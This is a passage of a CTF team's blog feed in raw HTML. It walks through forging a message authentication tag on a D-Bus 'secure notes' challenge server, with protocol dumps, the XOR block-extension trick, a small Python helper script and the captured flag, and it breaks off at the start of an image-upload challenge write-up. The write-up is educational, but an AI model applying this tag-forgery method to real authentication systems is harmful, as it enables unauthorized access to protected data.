</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Interface&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_genrnd&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Server&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_authc&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;iv&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;tag&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_auths&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_time&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_list&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_put&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;text&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_get&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_start&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>&lt;/node&gt;
</span><span class='line'>.l...........3.....o...../Server...s.....:1.30.....s.
</span><span class='line'>...dbus_start......l.................s.....:1.31.....u.......g..s....s.....:1.30....... ------------------------------------------------------
</span><span class='line'>|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
</span><span class='line'>| DOUCHEMAC-SHA256-CBC Authentication System           |
</span><span class='line'>| 1. start a session (valid 10 min)                    |
</span><span class='line'>| 2. authenticate                                      |
</span><span class='line'>| 3. work                                              |
</span><span class='line'>|                                                      |
</span><span class='line'>|                                                      |
</span><span class='line'>| NULL padding                                         |
</span><span class='line'> ------------------------------------------------------
</span><span class='line'>Use ID: 75288142666
</span><span class='line'>Use Nonce: z9TxSOvwZ21KDcHQeTef8Q== to xor your key!
</span><span class='line'>.
</span></code></pre></td></tr></table></div></figure>

<p>The other:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>.AUTH EXTERNAL 363636
</span><span class='line'>REJECTED EXTERNAL DBUS_COOKIE_SHA1 ANONYMOUS
</span><span class='line'>AUTH DBUS_COOKIE_SHA1 363636
</span><span class='line'>REJECTED EXTERNAL DBUS_COOKIE_SHA1 ANONYMOUS
</span><span class='line'>AUTH ANONYMOUS 6c69626462757320312e382e38
</span><span class='line'>OK aba45dc8a0c4d0ff480a9adc5433de97
</span><span class='line'>BEGIN
</span><span class='line'>l...........n.....o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....Hello...l...
</span><span class='line'>.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.32.l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l...
</span><span class='line'>.............o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....NameAcquired......s.....:1.32.....g..s....s.....org.freedesktop.DBus........:1.32.l...
</span><span class='line'>.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
</span><span class='line'>...Introspect......l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l.................s.....:1.32.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
</span><span class='line'>&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
</span><span class='line'>&lt;node name=&quot;/Server&quot;&gt;
</span><span class='line'>  &lt;interface name=&quot;org.freedesktop.DBus.Introspectable&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;Introspect&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Interface&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_genrnd&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Server&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_authc&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;iv&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;tag&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_auths&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_time&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_list&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_put&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;text&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_get&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_start&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>&lt;/node&gt;
</span><span class='line'>.l...
</span><span class='line'>.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
</span><span class='line'>...Introspect......l.................s.....:1.32.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
</span><span class='line'>&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
</span><span class='line'>&lt;node name=&quot;/Server&quot;&gt;
</span><span class='line'>  &lt;interface name=&quot;org.freedesktop.DBus.Introspectable&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;Introspect&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Interface&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_genrnd&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Server&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_authc&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;iv&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;tag&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_auths&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_time&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_list&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_put&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;text&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_get&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_start&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>&lt;/node&gt;
</span><span class='line'>.l...........?.....o...../Server...s.....:1.30.....s.....dbus_time.........g..s......75288142666.l.................s.....:1.32.....u.......g..s....s.....:1.30...
</span><span class='line'>...1412688735.91.l...........?.....o...../Server...s.....:1.30.....s.....dbus_genrnd.......g..s......75288142666.l.................s.....:1.32.....u.......g..s....s.....:1.30.......+pVgvsPDX1LI7xDc/AS9Fg==
</span><span class='line'>.
</span></code></pre></td></tr></table></div></figure>

<p>Here, we installed D-Feet, a d-bus debugger that can be used for remote interaction.</p>

<p>Using D-Feet to interact with the server, we called the help function, which returned:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'> ------------------------------------------------------
</span><span class='line'>|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
</span><span class='line'>| DOUCHEMAC-SHA256-CBC Authentication System           |
</span><span class='line'>|                                                      |
</span><span class='line'>| SPEC:                                                |
</span><span class='line'>|   blocksize = 16                                     |
</span><span class='line'>|   k = k ^ nonce                                      |
</span><span class='line'>|   while len(M) % 16: M || NULL                       |
</span><span class='line'>|   M = M<em>0 || M</em>1 ...                                 |
</span><span class='line'>|   tag<em>0 = sha256(k || M</em>0 ^ iv)                      |
</span><span class='line'>|   tag<em>i = sha256(k || M</em>i ^ tag_i-1)                 |
</span><span class='line'>|                                                      |
</span><span class='line'>| FUNCS:                                               |
</span><span class='line'>|   start : start session                              |
</span><span class='line'>|   genrnd: get random numer                           |
</span><span class='line'>|   time  : get time                                   |
</span><span class='line'>|   list  : list files                                 |
</span><span class='line'>|   put   : put file                                   |
</span><span class='line'>|   get   : get file                                   |
</span><span class='line'>|   auths : server authentication                      |
</span><span class='line'>|   authc : client authentication                      |
</span><span class='line'>|                                                      |
</span><span class='line'>| NOTE:                                                |
</span><span class='line'>|   session times out                                  |
</span><span class='line'>|   connection limit                                   |
</span><span class='line'> ------------------------------------------------------
</span></code></pre></td></tr></table></div></figure></p>

<p>Calling the start function gives us a session ID and a nonce:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>\r\nUse ID: 688383258476362303\r\nUse Nonce: 2bH5BJ5gR4FPnw8JIPvMgw== to xor your key!\r\n&#39;
</span></code></pre></td></tr></table></div></figure>
It became apparent that we needed to authenticate to the server by calling authc(id, msg, iv, tag) where msg is a base64-encoded raw message, the iv we used, and the tag of the message as generated by the algorithm in &#8220;SPEC&#8221; of the help response.
Auths(id, msg) would return an iv and tag of msg, but when we try to feed this output directly into authc(), we receive:

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>u&#39;IV : eDmGlE34dc6xjskpRtaCQg==\r\nMsg: YmxhaA==\r\nTag: GGzDwlaGGl+MBlMO2Svbmw==\r\n&#39;
</span><span class='line'>u&#39;Please choose another message!\r\n&#39;
</span></code></pre></td></tr></table></div></figure>
Next, we tried exploiting the fact that, given the algorithm they are using, we could flip a bit in the first block of the message and flip the corresponding bit in the IV without affecting the tag of the message. So we gave auths() the msg in the first line below, and then flipped a bit in the provided IV and in the original msg (line 2). We gave this to authc() and received line 3.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>u&#39;IV : JNuQTRBq+1uYePtwjyt8KQ==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: 78Eb6hYOZFu4yOGNVWxjDQ==\r\n&#39;
</span><span class='line'>&quot;215791365151423835&quot;, &#39;AQAAAAAAAAAAAAAAAAAAAA==&#39;, &#39;JduQTRBq+1uYePtwjyt8KQ==&#39;, &#39;78Eb6hYOZFu4yOGNVWxjDQ==&#39;
</span><span class='line'>u&#39;Please choose a different message length (blocks: 1)!\r\n&#39;
</span></code></pre></td></tr></table></div></figure>

<p>Now we knew that the message we give to authc() needs to be of different length than the one we give to auths(). Finally, we saw that we could extend the message in the following way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'> if M_i = M_0 ^ iv ^ tag_0
</span><span class='line'> then tag_1 = sha256(k || M_i ^ tag_0) = sha256(k || M_0 ^ iv ^ tag_0 ^ tag_0) = tag_0
</span></code></pre></td></tr></table></div></figure>

<p>So, we generated the following from auths() using a message block of all 0&#8217;s:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>u&#39;IV : qyvebQDUhwtfPApJ/liLzQ==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: HBF3ALjqxh6DncNXUxU8EA==\r\n&#39;
</span></code></pre></td></tr></table></div></figure>

<p>and then we could append a second block onto our message, M<em>1 = M</em>0 ^ iv ^ tag. Giving this longer message to authc() along with the same tag and iv yielded authentication:1.</p>

<p>We then simply needed to call list() and decode the response to get the name of the file containing the flag, secret.txt. We then encoded secret.txt and sent the get(id, file) command, which returned the flag:</p>

<p>u&#8217;flag{c6Lnm39r950dlh6WzeIN}\n&#8217;</p>

<p>helpful script:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">flip<em>bit</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span><span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">m1</span><span class="p">,</span> <span class="n">m2</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s1</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s2</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">m2</span><span class="p">))</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">cat</span><span class="p">(</span><span class="n">m1</span><span class="p">,</span><span class="n">m2</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s1</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s2</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">m2</span><span class="p">))</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">s1</span><span class="o">+</span><span class="n">s2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#u&#39;IV : EgPPG3/6IoWYHDK7/ySL1g==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: 31HfnMcBiAZj8CgMaZC78w==\r\n&#39;</span>
</span><span class='line'><span class="c"># want msg = (M</em>0 || M<em>0 ^ iv ^ tag</em>0)</span>
</span><span class='line'><span class="c"># return msg, iv, tag</span>
</span><span class='line'><span class="k">def</span> <span class="nf">mk<em>params</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
</span><span class='line'>  <span class="n">m</em>i</span> <span class="o">=</span> <span class="n">cat</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">xor</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">iv</span><span class="p">),</span> <span class="n">tag</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;&#39;</span><span class="si">%s</span><span class="s">&#39;, &#39;</span><span class="si">%s</span><span class="s">&#39;, &#39;</span><span class="si">%s</span><span class="s">&#39;&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">m_i</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">tag</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - ImageUpload]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/"/>
    <updated>2014-10-24T09:25:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>In the Wild Wild Web, there are really bad guys. The sheriff doesn&#8217;t know them all. Therefore, he needs your help.
Upload pictures of criminals to this site and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!</p>

<p>Pictures will be deleted on regular basis!</p>

<h2>Analysis</h2>

